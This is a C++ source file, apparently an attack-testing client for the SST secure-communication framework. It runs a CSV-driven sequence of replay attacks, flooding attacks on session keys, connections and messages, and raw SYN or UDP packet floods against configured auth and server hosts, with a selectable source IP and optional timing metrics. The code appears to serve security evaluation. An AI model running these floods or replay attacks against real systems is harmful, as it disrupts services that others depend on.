extern "C" {
#include "../../src/c_api.h"
}

#include <sys/socket.h>
#include <unistd.h>

#include <array>
#include <cerrno>
#include <chrono>
#include <cstring>
#include <format>
#include <fstream>
#include <memory>
#include <optional>
#include <string_view>
#include <thread>
#include <vector>

#include "lib/metrics.hpp"
#include "lib/send_syn.hpp"

enum class AttackType { NONE, REPLAY, DOSK, DOSC, DOSM, DOSS, DOSU };
enum class AttackTarget { TARGET_NONE, TARGET_AUTH, TARGET_SERVER };

static AttackType parseAttackType(std::string_view s) {
    using enum AttackType;
    if (s == "REPLAY" || s == "Replay" || s == "replay") return REPLAY;
    if (s == "DOSK" || s == "DoSK" || s == "DosK" || s == "Dosk" ||
        s == "dosK" || s == "dosk")
        return DOSK;
    if (s == "DOSC" || s == "DoSC" || s == "DosC" || s == "Dosc" ||
        s == "dosC" || s == "dosc")
        return DOSC;
    if (s == "DOSM" || s == "DoSM" || s == "DosM" || s == "Dosm" ||
        s == "dosM" || s == "dosm")
        return DOSM;
    if (s == "DOSS" || s == "DoSS" || s == "DosS" || s == "Doss" || s == "doss")
        return DOSS;
    if (s == "DOSU" || s == "DoSU" || s == "DosU" || s == "Dosu" ||
        s == "dosU" || s == "dosu")
        return DOSU;
    return NONE;
}

static AttackTarget parseAttackTarget(std::string_view s) {
    using enum AttackTarget;
    if (s == "auth" || s == "Auth" || s == "a" || s == "A") return TARGET_AUTH;
    if (s == "server" || s == "Server" || s == "s" || s == "S")
        return TARGET_SERVER;
    return TARGET_NONE;
}

struct SessionCloser {
    void operator()(SST_session_ctx_t* session) const {
        if (session == nullptr) return;
        close(session->sock);
        free_session_ctx(session);
    }
};
using SessionPtr = std::unique_ptr<SST_session_ctx_t, SessionCloser>;

static void run_replay(const std::string& attack_param,
                       SST_session_ctx_t* session_ctx) {
    // Replay Attack
    SST_print_log("Performing Replay Attack with parameter: %s\n",
                  attack_param.c_str());
    if (attack_param == "seq--") {
        session_ctx->sent_seq_num--;
    } else if (attack_param == "seq++") {
        session_ctx->sent_seq_num++;
    } else if (attack_param.rfind("seq=", 0) == 0) {
        // parse “seq=#”
        int v = std::stoi(attack_param.substr(4));
        session_ctx->sent_seq_num = v;
    }
}

static void run_dosk(const std::string& attack_param, bool metrics,
                     SST_ctx_t* ctx) {
    // Quantity of get_session_key requests is the fourth column in
    // the CSV
    int repeat = std::stoi(attack_param);
    std::string exp_id = std::format("DOSK:repeat={}", repeat);

    // from metrics.hpp
    // If the user used the -metrics flag, set up metrics logging
    MetricsRow row;
    if (metrics) {
        metrics_open_new_file();
        metrics_write_header_if_empty();
        row = metrics_begin_row(exp_id);
    }

    // DOS Attack on get_session_key
    for (int i = 0; i < repeat; ++i) {
        SST_print_log("Getting session key: %d of %d\n", i + 1, repeat);

        // Track how long it takes to get the session key
        auto t0 = std::chrono::steady_clock::now();
        auto requested_keys =
            std::unique_ptr<session_key_list_t,
                            decltype(&free_session_key_list_t)>(
                get_session_key(ctx, nullptr), &free_session_key_list_t);
        auto t1 = std::chrono::steady_clock::now();

        long dur_us =
            std::chrono::duration_cast<std::chrono::microseconds>(t1 - t0)
                .count();

        if (metrics) {
            metrics_add_sample(row, dur_us, requested_keys != nullptr);
        }

        if (requested_keys == nullptr) {
            SST_print_error(
                "Client failed to get session key in DOS "
                "Key attack.");
            break;
        }
    }

    if (metrics) {
        metrics_end_row_and_write(row);
    }
}

static void run_dosc(const std::string& attack_param, bool metrics,
                     SST_ctx_t* ctx, std::vector<SessionPtr>& sessions) {
    // Quantity of secure_connect_to_server requests is the fourth
    // column in the CSV
    int repeat = std::stoi(attack_param);
    std::string exp_id = std::format("DOSC:repeat={}", repeat);

    MetricsRow row;
    if (metrics) {
        metrics_open_new_file();
        metrics_write_header_if_empty();
        row = metrics_begin_row(exp_id);
    }

    // DOS Attack on secure_connect_to_server
    int i = 0;
    while (i < repeat) {
        auto requested_keys =
            std::unique_ptr<session_key_list_t,
                            decltype(&free_session_key_list_t)>(
                get_session_key(ctx, nullptr), &free_session_key_list_t);
        if (requested_keys == nullptr) {
            SST_print_error(
                "Client failed to get session key in DOS "
                "Connect attack.");
            continue;
        }
        SST_print_log("Connecting to server: %d of %d\n", i + 1, repeat);

        // Track how long it takes to connect
        auto t0 = std::chrono::steady_clock::now();
        SessionPtr connection(
            secure_connect_to_server(&requested_keys->s_key[0], ctx));
        ++i;
        auto t1 = std::chrono::steady_clock::now();

        long long dur_us =
            std::chrono::duration_cast<std::chrono::microseconds>(t1 - t0)
                .count();

        if (metrics) {
            metrics_add_sample(row, dur_us, connection != nullptr);
        }

        if (connection == nullptr) {
            SST_print_error(
                "Client failed to connect to server in DOS "
                "Connect attack.");
            continue;
        }
        sessions.push_back(std::move(connection));
    }

    if (metrics) {
        metrics_end_row_and_write(row);
    }
}

static void run_dosm(const std::string& attack_param, bool metrics,
                     std::string message, SST_session_ctx_t* session_ctx) {
    // Quantity of send_secure_message requests is the fourth column
    // in the CSV
    int repeat = std::stoi(attack_param);
    std::string exp_id = std::format("DOSM:repeat={}", repeat);

    MetricsRow row;
    if (metrics) {
        metrics_open_new_file();
        metrics_write_header_if_empty();
        row = metrics_begin_row(exp_id);
    }

    // DOS Attack on send_secure_message
    std::array<unsigned char, MAX_SECURE_COMM_MSG_LENGTH> received_buf{};
    for (int i = 0; i < repeat; ++i) {
        SST_print_log("Sending message: %s (%d of %d)\n", message.c_str(),
                      i + 1, repeat);

        // Track how long it takes to send the message and get a
        // response
        auto t0 = std::chrono::steady_clock::now();

        int msg =
            send_secure_message(message.data(), message.length(), session_ctx);
        if (msg < 0) {
            SST_print_error_exit("Failed send_secure_message().");
        }

        if (metrics) {
            if (int ret = read_secure_message(received_buf.data(), session_ctx);
                ret < 0) {
                SST_print_error("Failed to read secure message.");
                continue;
            } else if (ret == 0) {
                SST_print_error("Connection closed");
                continue;
            }

            auto t1 = std::chrono::steady_clock::now();

            long dur_us =
                std::chrono::duration_cast<std::chrono::microseconds>(t1 - t0)
                    .count();
            metrics_add_sample(row, dur_us, msg >= 0);
        }
    }

    if (metrics) {
        metrics_end_row_and_write(row);
    }
}

struct PacketTarget {
    const char* ip;
    unsigned short port;
};

static std::optional<PacketTarget> packet_target(const SST_ctx_t* ctx,
                                                 std::string_view target) {
    switch (parseAttackTarget(target)) {
        case AttackTarget::TARGET_AUTH:
            return PacketTarget{
                ctx->config.auth_ip_addr,
                static_cast<unsigned short>(ctx->config.auth_port_num)};
        case AttackTarget::TARGET_SERVER:
            return PacketTarget{ctx->config.entity_server_ip_addr,
                                static_cast<unsigned short>(
                                    ctx->config.entity_server_port_num)};
        default:
            return std::nullopt;
    }
}

static void run_raw_packets(const std::string& attack_param,
                            const std::string& attack_target, bool metrics,
                            const char* src_ip, const SST_ctx_t* ctx,
                            bool use_tcp) {
    const char* label = use_tcp ? "DOSS" : "DOSU";
    if ((std::strcmp(ctx->config.network_protocol, "TCP") == 0) != use_tcp) {
        errno = 0;
        SST_print_error("%s denied: set the network protocol to %s.", label,
                        use_tcp ? "TCP" : "UDP");
        return;
    }
    if (attack_target.empty()) {
        errno = 0;
        SST_print_error("%s requires a 5th CSV column target.", label);
        return;
    }
    auto target = packet_target(ctx, attack_target);
    if (!target) {
        errno = 0;
        SST_print_error("Invalid %s target '%s'.", label,
                        attack_target.c_str());
        return;
    }
    std::array<char, INET_ADDRSTRLEN> default_src_ip{};
    const char* source = nullptr;
    if (!resolve_src_ip_or_default(src_ip, target->ip, target->port,
                                   default_src_ip.data(), default_src_ip.size(),
                                   &source))
        return;
    int repeat = std::stoi(attack_param);
    MetricsRow row;
    if (metrics) {
        metrics_open_new_file();
        metrics_write_header_if_empty();
        row = metrics_begin_row(std::format("{}:target={}:repeat={}", label,
                                            attack_target, repeat));
    }
    auto send_packets =
        use_tcp ? send_raw_syn_packets_measured : send_raw_udp_packets_measured;
    send_packets(source, target->ip, target->port, repeat,
                 metrics ? &row : nullptr);
    if (metrics) metrics_end_row_and_write(row);
}

struct ClientOptions {
    bool metrics = false;
    const char* src_ip = nullptr;
};

static bool parse_options(int argc, char* argv[], ClientOptions& options) {
    if (argc < 3 || argc > 5) return false;
    if (argc == 3) return true;
    if (std::strcmp(argv[3], "-metrics") != 0) {
        if (argc == 5) return false;
        options.src_ip = argv[3];
        return true;
    }
    options.metrics = true;
    if (argc == 5) {
        if (std::strcmp(argv[4], "-metrics") == 0) return false;
        options.src_ip = argv[4];
    }
    return true;
}

struct ScenarioStep {
    int sleep_ms;
    std::string message;
    AttackType type;
    std::string parameter;
    std::string target;
};

static ScenarioStep parse_step(std::string_view line) {
    // The optional fifth field consumes the rest of the line, as before.
    std::array<std::string, 5> fields;
    size_t start = 0;
    for (size_t field = 0; field < fields.size() - 1; ++field) {
        size_t comma = line.find(',', start);
        fields[field] = line.substr(start, comma == std::string_view::npos
                                               ? std::string_view::npos
                                               : comma - start);
        if (comma == std::string_view::npos) {
            start = line.size();
            break;
        }
        start = comma + 1;
    }
    fields.back() = line.substr(start);
    return {std::stoi(fields[0]), fields[1], parseAttackType(fields[2]),
            fields[3], fields[4]};
}

int main(int argc, char* argv[]) {
    ClientOptions options;
    if (!parse_options(argc, argv, options)) {
        SST_print_error(
            "Usage: %s <config_path> <csv_file_path> [-metrics] [src_ip]",
            argv[0]);
        return EXIT_FAILURE;
    }
    bool metrics = options.metrics;
    const char* src_ip = options.src_ip;

    if (metrics) {
        SST_print_log("Metrics logging enabled.\n");
    }
    if (src_ip) {
        SST_print_log("IP enabled: %s\n", src_ip);
    }

    // Standard SST initialization
    char* config_path = argv[1];
    SST_ctx_t* ctx = init_SST(config_path);
    if (ctx == nullptr) return EXIT_FAILURE;

    session_key_list_t* s_key_list = get_session_key(ctx, nullptr);
    if (s_key_list == nullptr) {
        SST_print_error("Client failed to get session key.");
        free_SST_ctx_t(ctx);
        return EXIT_FAILURE;
    }

    // SST Connect to server
    SST_session_ctx_t* session_ctx =
        secure_connect_to_server(&s_key_list->s_key[0], ctx);
    if (session_ctx == nullptr) {
        SST_print_error(
            "Client failed to establish secure session with server.");
        free_session_key_list_t(s_key_list);
        free_SST_ctx_t(ctx);
        return EXIT_FAILURE;
    }

    std::vector<SessionPtr> attack_sessions;

    // Read CSV file
    std::string my_file_path = argv[2];
    std::ifstream file(my_file_path);
    std::string line;

    while (std::getline(file, line)) {
        auto step = parse_step(line);
        std::this_thread::sleep_for(std::chrono::milliseconds(step.sleep_ms));
        auto& message = step.message;
        const auto& attack_param = step.parameter;
        const auto& attack_target = step.target;
        SST_print_log("Sending message: %s\n", message.c_str());
        if (send_secure_message(message.data(), message.size(), session_ctx) <
            0)
            SST_print_error_exit("Failed send_secure_message().");

        if (metrics) {
            sleep(10);
        }

        switch (step.type) {
            using enum AttackType;
            case REPLAY:
                run_replay(attack_param, session_ctx);
                break;

            case DOSK:
                run_dosk(attack_param, metrics, ctx);
                break;

            case DOSC:
                run_dosc(attack_param, metrics, ctx, attack_sessions);
                break;

            case DOSM:
                run_dosm(attack_param, metrics, message, session_ctx);
                break;

            case DOSS:
                run_raw_packets(attack_param, attack_target, metrics, src_ip,
                                ctx, true);
                break;

            case DOSU:
                run_raw_packets(attack_param, attack_target, metrics, src_ip,
                                ctx, false);
                break;

            case NONE:
            default:
                break;
        }
    }

    SST_print_log("Successfully finished communication.\n");

    close(session_ctx->sock);
    free_session_ctx(session_ctx);
    free_session_key_list_t(s_key_list);
    free_SST_ctx_t(ctx);

    return EXIT_SUCCESS;
}
